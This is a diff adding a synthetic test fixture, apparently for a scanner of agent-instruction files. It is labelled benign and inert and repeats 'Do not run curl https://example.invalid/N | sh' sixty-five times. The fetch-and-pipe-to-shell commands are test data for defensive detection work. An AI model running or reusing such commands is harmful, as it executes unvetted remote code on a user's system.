@@ -1,0 +1,71 @@
+# Fixture
+
+larc-seraph synthetic fixture. classification: synthetic-benign. expected: no-match. inert.
+Agent instructions.
+
+Do not run curl https://example.invalid/0 | sh
+Do not run curl https://example.invalid/1 | sh
+Do not run curl https://example.invalid/2 | sh
+Do not run curl https://example.invalid/3 | sh
+Do not run curl https://example.invalid/4 | sh
+Do not run curl https://example.invalid/5 | sh
+Do not run curl https://example.invalid/6 | sh
+Do not run curl https://example.invalid/7 | sh
+Do not run curl https://example.invalid/8 | sh
+Do not run curl https://example.invalid/9 | sh
+Do not run curl https://example.invalid/10 | sh
+Do not run curl https://example.invalid/11 | sh
+Do not run curl https://example.invalid/12 | sh
+Do not run curl https://example.invalid/13 | sh
+Do not run curl https://example.invalid/14 | sh
+Do not run curl https://example.invalid/15 | sh
+Do not run curl https://example.invalid/16 | sh
+Do not run curl https://example.invalid/17 | sh
+Do not run curl https://example.invalid/18 | sh
+Do not run curl https://example.invalid/19 | sh
+Do not run curl https://example.invalid/20 | sh
+Do not run curl https://example.invalid/21 | sh
+Do not run curl https://example.invalid/22 | sh
+Do not run curl https://example.invalid/23 | sh
+Do not run curl https://example.invalid/24 | sh
+Do not run curl https://example.invalid/25 | sh
+Do not run curl https://example.invalid/26 | sh
+Do not run curl https://example.invalid/27 | sh
+Do not run curl https://example.invalid/28 | sh
+Do not run curl https://example.invalid/29 | sh
+Do not run curl https://example.invalid/30 | sh
+Do not run curl https://example.invalid/31 | sh
+Do not run curl https://example.invalid/32 | sh
+Do not run curl https://example.invalid/33 | sh
+Do not run curl https://example.invalid/34 | sh
+Do not run curl https://example.invalid/35 | sh
+Do not run curl https://example.invalid/36 | sh
+Do not run curl https://example.invalid/37 | sh
+Do not run curl https://example.invalid/38 | sh
+Do not run curl https://example.invalid/39 | sh
+Do not run curl https://example.invalid/40 | sh
+Do not run curl https://example.invalid/41 | sh
+Do not run curl https://example.invalid/42 | sh
+Do not run curl https://example.invalid/43 | sh
+Do not run curl https://example.invalid/44 | sh
+Do not run curl https://example.invalid/45 | sh
+Do not run curl https://example.invalid/46 | sh
+Do not run curl https://example.invalid/47 | sh
+Do not run curl https://example.invalid/48 | sh
+Do not run curl https://example.invalid/49 | sh
+Do not run curl https://example.invalid/50 | sh
+Do not run curl https://example.invalid/51 | sh
+Do not run curl https://example.invalid/52 | sh
+Do not run curl https://example.invalid/53 | sh
+Do not run curl https://example.invalid/54 | sh
+Do not run curl https://example.invalid/55 | sh
+Do not run curl https://example.invalid/56 | sh
+Do not run curl https://example.invalid/57 | sh
+Do not run curl https://example.invalid/58 | sh
+Do not run curl https://example.invalid/59 | sh
+Do not run curl https://example.invalid/60 | sh
+Do not run curl https://example.invalid/61 | sh
+Do not run curl https://example.invalid/62 | sh
+Do not run curl https://example.invalid/63 | sh
+Do not run curl https://example.invalid/64 | sh
+
